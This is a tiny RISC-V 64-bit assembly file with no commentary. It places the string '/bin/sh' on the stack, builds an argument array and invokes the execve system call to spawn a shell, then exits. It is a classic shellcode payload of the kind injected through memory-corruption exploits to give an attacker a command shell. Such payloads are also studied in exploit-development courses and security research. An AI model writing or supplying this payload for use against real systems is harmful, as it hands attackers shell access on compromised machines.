	.globl	_start
	
	.text
_start:
	li	a0, 0x0068732f6e69622f
	addi	sp, sp, -24
	sd	a0, 16(sp)
	addi	a0, sp, 16
	sd	zero, 8(sp)
	addi	a2, sp, 8
	sd	a0, 0(sp)
	mv	a1, sp	
	li	a7, 221
	ecall
	li	a7, 94
	li	a0, 0
	ecall

	.data
